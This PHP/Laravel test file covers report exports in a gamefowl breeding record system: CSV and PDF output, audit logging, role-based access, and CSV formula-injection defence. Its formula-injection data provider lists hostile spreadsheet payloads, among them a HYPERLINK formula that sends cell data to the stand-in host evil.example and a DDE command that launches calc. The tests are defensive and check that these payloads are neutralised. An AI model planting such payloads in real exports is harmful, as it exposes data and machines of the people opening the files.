<?php

declare(strict_types=1);

namespace Tests\Feature\Reports;

use App\Http\Controllers\ReportController;
use App\Models\BreedingRecord;
use App\Models\Broodcock;
use App\Models\HealthRecord;
use App\Models\MortalityRecord;
use App\Models\PerformanceRecord;
use App\Models\Report;
use App\Models\User;
use App\Reports\ReportRegistry;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Integration tests for the export layer.
 *
 * Each report class is unit-tested by itself; this covers the seam none of
 * those tests reach - the HTTP route, the authorization gate, the streamed
 * CSV, the rendered PDF, and the audit row that must be written every time.
 */
final class ReportExportTest extends TestCase
{
    use RefreshDatabase;

    /** Enough data that every report has something to say. */
    private function seedSomething(): void
    {
        $sire = Broodcock::factory()->male()->create(['bloodline' => 'Sweater']);
        $dam = Broodcock::factory()->female()->create(['bloodline' => 'Sweater']);

        HealthRecord::factory()->for($sire)->create([
            'checkup_date' => today()->subDays(60),
            'next_due_date' => today()->subDays(10),
        ]);
        BreedingRecord::factory()->forPair($sire, $dam)->create();
        PerformanceRecord::factory()->for($sire)->create();

        $dead = Broodcock::factory()->create(['status' => 'deceased']);
        MortalityRecord::factory()->for($dead)->create();
    }

    public static function reportKeys(): array
    {
        return [
            'broodcock inventory' => ['broodcock_inventory'],
            'health compliance' => ['health_compliance'],
            'breeding performance' => ['breeding_performance'],
            'mortality' => ['mortality'],
            'performance history' => ['performance_history'],
        ];
    }

    // -----------------------------------------------------------------
    // Every registered report must actually export
    // -----------------------------------------------------------------

    #[DataProvider('reportKeys')]
    public function test_every_report_exports_a_csv(string $key): void
    {
        $this->seedSomething();

        $response = $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.csv', $key));

        $response->assertOk();
        $response->assertHeader('content-type', 'text/csv; charset=UTF-8');

        $body = $response->streamedContent();

        // Excel needs the BOM to render accented Filipino names correctly.
        $this->assertStringStartsWith("\xEF\xBB\xBF", $body, 'CSV is missing the UTF-8 BOM.');
        $this->assertNotEmpty(trim($body), 'CSV body was empty.');
    }

    #[DataProvider('reportKeys')]
    public function test_every_report_renders_a_real_pdf(string $key): void
    {
        $this->seedSomething();

        $response = $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.pdf', $key));

        $response->assertOk();

        // NB: dompdf's download() returns a plain Response, not a
        // StreamedResponse (unlike the CSV export), so the body is read with
        // getContent() rather than streamedContent().
        $body = $response->getContent();

        // A dompdf template that references an unsupported CSS feature throws
        // at render time rather than degrading, so this assertion is the one
        // that proves the templates are genuinely CSS 2.1.
        $this->assertStringStartsWith('%PDF', $body, "Report [{$key}] did not produce a PDF.");
        $this->assertGreaterThan(1000, strlen($body), "Report [{$key}] produced a suspiciously small PDF.");
    }

    /** The registry and the routes must not drift apart. */
    public function test_every_registered_report_key_is_reachable(): void
    {
        foreach (app(ReportRegistry::class)->keys() as $key) {
            $this->actingAs(User::factory()->owner()->create())
                ->get(route('reports.csv', $key))
                ->assertOk();
        }
    }

    public function test_an_unknown_report_is_a_404_not_a_crash(): void
    {
        $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.csv', 'not_a_real_report'))
            ->assertNotFound();
    }

    // -----------------------------------------------------------------
    // The audit trail - this is the promise the thesis makes
    // -----------------------------------------------------------------

    public function test_generating_a_report_writes_an_audit_row(): void
    {
        $this->seedSomething();
        $owner = User::factory()->owner()->create();

        $this->assertSame(0, Report::count());

        $this->actingAs($owner)
            ->get(route('reports.csv', 'broodcock_inventory'))
            ->streamedContent();

        $this->assertSame(1, Report::count());

        $entry = Report::first();

        $this->assertSame('broodcock_inventory', $entry->report_type);
        $this->assertSame('csv', $entry->format);
        $this->assertSame($owner->id, $entry->generated_by);
        $this->assertNotNull($entry->generated_at);
        $this->assertNotNull($entry->row_count);
    }

    /** The audit row must record the exact filters, or it cannot be reproduced. */
    public function test_the_audit_row_records_the_filters_that_were_used(): void
    {
        $this->seedSomething();

        $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.csv', 'broodcock_inventory').'?from=2020-01-01&to=2030-12-31&status=active')
            ->streamedContent();

        $parameters = Report::first()->parameters;

        $this->assertIsArray($parameters);
        $this->assertNotEmpty($parameters, 'The audit row recorded no filters at all.');

        $flattened = json_encode($parameters);
        $this->assertStringContainsString('2020-01-01', $flattened);
        $this->assertStringContainsString('2030-12-31', $flattened);
    }

    public function test_csv_and_pdf_are_audited_separately(): void
    {
        $this->seedSomething();
        $owner = User::factory()->owner()->create();

        $this->actingAs($owner)->get(route('reports.csv', 'mortality'))->streamedContent();
        $this->actingAs($owner)->get(route('reports.pdf', 'mortality'))->getContent();

        $this->assertSame(2, Report::count());
        $this->assertEqualsCanonicalizing(['csv', 'pdf'], Report::pluck('format')->all());
    }

    // -----------------------------------------------------------------
    // Authorization
    // -----------------------------------------------------------------

    public function test_a_record_keeper_can_generate_reports(): void
    {
        $this->seedSomething();

        $this->actingAs(User::factory()->staff()->create())
            ->get(route('reports.csv', 'broodcock_inventory'))
            ->assertOk();
    }

    /**
     * Reports aggregate breeding and mortality figures a customer must never
     * see, so the export endpoints are closed to them outright.
     */
    public function test_a_customer_cannot_generate_a_report(): void
    {
        $this->seedSomething();

        $this->actingAs(User::factory()->customer()->create())
            ->get(route('reports.csv', 'mortality'))
            ->assertForbidden();

        $this->actingAs(User::factory()->customer()->create())
            ->get(route('reports.pdf', 'mortality'))
            ->assertForbidden();

        $this->assertSame(0, Report::count(), 'A refused export must not write an audit row.');
    }

    public function test_a_customer_cannot_view_the_reports_screen(): void
    {
        $this->actingAs(User::factory()->customer()->create())
            ->get(route('reports.index'))
            ->assertForbidden();
    }

    public function test_a_guest_cannot_generate_a_report(): void
    {
        $this->get(route('reports.csv', 'broodcock_inventory'))
            ->assertRedirect(route('login'));

        $this->assertSame(0, Report::count());
    }

    public function test_a_deactivated_owner_cannot_generate_a_report(): void
    {
        $this->actingAs(User::factory()->owner()->inactive()->create())
            ->get(route('reports.csv', 'broodcock_inventory'))
            ->assertRedirect(route('login'));
    }

    // -----------------------------------------------------------------
    // The reports screen
    // -----------------------------------------------------------------

    public function test_the_reports_screen_lists_every_registered_report(): void
    {
        $response = $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.index'))
            ->assertOk();

        foreach (app(ReportRegistry::class)->all() as $report) {
            $response->assertSee($report->title(), escape: false);
        }
    }

    public function test_the_reports_screen_shows_the_generation_history(): void
    {
        $this->seedSomething();
        $owner = User::factory()->owner()->create(['full_name' => 'Elena Reyes']);

        $this->actingAs($owner)->get(route('reports.csv', 'broodcock_inventory'))->streamedContent();

        $this->actingAs($owner)
            ->get(route('reports.index'))
            ->assertOk()
            ->assertSee('Elena Reyes')
            ->assertSee('CSV');
    }

    // -----------------------------------------------------------------
    // CSV formula injection
    //
    // Every free-text field in this system reaches an export, and a
    // spreadsheet executes a cell that begins with = + - or @. The payload is
    // stored perfectly safely and does its damage in Excel, which is why this
    // has to be handled where the file is written rather than where the text
    // is displayed.
    // -----------------------------------------------------------------

    /**
     * @return array<string, array{0: string}>
     */
    public static function formulaPayloads(): array
    {
        return [
            'equals' => ['=1+1'],
            'plus' => ['+1+1'],
            'at sign' => ['@SUM(A1)'],
            'hyperlink exfiltration' => ['=HYPERLINK("http://evil.example/?"&A1,"Open")'],
            'minus with a payload' => ['-2+3+cmd|\' /c calc\'!A0'],
            'leading tab hides the equals' => ["\t=1+1"],
            'leading space hides the equals' => [' =1+1'],
        ];
    }

    #[DataProvider('formulaPayloads')]
    public function test_a_formula_typed_into_a_bird_name_is_neutralised_in_the_csv(string $payload): void
    {
        Broodcock::factory()->create(['name' => $payload, 'band_number' => 'GF-0001']);

        $body = $this->actingAs(User::factory()->owner()->create())
            ->get(route('reports.csv', 'broodcock_inventory'))
            ->streamedContent();

        // Parsed, not substring-matched: fputcsv doubles every quote inside a
        // field, so the raw bytes of a payload containing quotes never appear
        // in the file verbatim. What matters is the value a spreadsheet DECODES
        // the cell to, which is what str_getcsv reproduces.
        $name = $this->csvCell($body, 'Name');

        // Prefixed with an apostrophe, which a spreadsheet reads as "the rest
        // of this is literal text" and does not display.
        $this->assertSame("'".$payload, $name);

        // And the text is still all there - neutralising must not silently
        // discard a record keeper's data, only stop it being executed.
        $this->assertStringContainsString($payload, $name);
    }

    /** The value of one column in the first data row of a CSV export. */
    private function csvCell(string $body, string $column): string
    {
        $lines = preg_split('/\R/', trim(ltrim($body, "\xEF\xBB\xBF")));

        $headers = str_getcsv((string) $lines[0]);
        $row = str_getcsv((string) $lines[1]);

        $index = array_search($column, $headers, true);
        $this->assertNotFalse($index, "No [{$column}] column in the export.");

        return (string) $row[$index];
    }

    /**
     * Negative numbers are the reason this is not a blanket prefix.
     *
     * Quoting them would turn every negative figure on every report into text,
     * breaking sorting and SUM() on the columns the report exists for. A value
     * that is genuinely numeric cannot carry a payload.
     */
    public function test_a_negative_number_is_not_quoted(): void
    {
        $this->assertSame('-12.5', $this->neutralize('-12.5'));
        $this->assertSame('-3', $this->neutralize('-3'));
        $this->assertSame('0', $this->neutralize('0'));
    }

    public function test_ordinary_text_is_untouched(): void
    {
        $this->assertSame('Bruno', $this->neutralize('Bruno'));
        $this->assertSame('Died of heat stress', $this->neutralize('Died of heat stress'));
        $this->assertSame('', $this->neutralize(null));
    }

    /** Reaches the controller's private helper, which has no other seam. */
    private function neutralize(string|int|float|null $value): string|int|float
    {
        $method = new \ReflectionMethod(ReportController::class, 'neutralizeFormula');

        return $method->invoke(null, $value);
    }
}
